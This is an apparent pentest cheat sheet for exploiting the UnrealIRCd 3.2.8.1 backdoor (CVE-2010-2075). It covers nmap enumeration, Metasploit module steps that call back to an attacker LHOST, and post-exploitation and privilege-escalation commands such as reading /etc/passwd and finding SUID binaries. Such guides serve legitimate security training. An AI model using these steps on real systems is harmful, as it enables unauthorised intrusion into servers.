##### #UnrealIRCd - Port 6667

UnrealIRCd is an IRC (Internet Relay Chat) server that allows users to communicate through channels and private messages.

##### Enumeration

```bash
nmap -T4 -sV -sC -p 6667 <ip> -Pn
```

: scan the target and identify the IRC service and version.

```bash
nmap -p 6667 --script irc-info <ip>
```

: gather additional information about the IRC server.

```bash
searchsploit UnrealIRCd
```

: search for known vulnerabilities and exploits.

**Well-known vulnerability: CVE-2010-2075**

UnrealIRCd 3.2.8.1 - Backdoor Command Execution

Some distributed UnrealIRCd 3.2.8.1 source archives contained a backdoor that allows unauthenticated remote command execution.

##### Exploitation

Use Metasploit for exploitation.

```bash
msfconsole
```

: start Metasploit.

```text
search unrealircd
```

: search for available UnrealIRCd exploits.

```text
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

: select the backdoor exploit module.

```text
show options
```

: view the required options.

```text
set RHOSTS <target_ip>
```

: set the target IP address.

```text
show payloads
```

: view compatible payloads.

Configure the required payload and local options according to the module:

```text
set LHOST <your_kali_ip>
set LPORT <your_port>
```

: configure the attacker's IP address and listening port, if required.

```text
exploit
```

: execute the exploit.

If successful, you may get a command shell.

**Post-Exploitation**

```bash
whoami
```

: check the current username.

```bash
id
```

: check user ID and group privileges.

```bash
pwd
```

: show the current directory.

```bash
uname -a
```

: check system and kernel information.

```bash
cat /etc/passwd
```

: list local user accounts.

**Privilege Escalation**

After gaining access, check for possible privilege escalation opportunities.

```bash
sudo -l
```

: check available sudo permissions.

```bash
find / -perm -4000 -type f 2>/dev/null
```

: find SUID binaries.

```bash
getcap -r / 2>/dev/null
```

: find files with Linux capabilities.

```bash
ps aux
```

: list running processes.

Investigate the results and look for possible privilege escalation paths.

**Important:** CVE-2010-2075 affects certain compromised UnrealIRCd 3.2.8.1 source distributions, not necessarily every installation of that version. Successful exploitation also does not automatically provide root access.
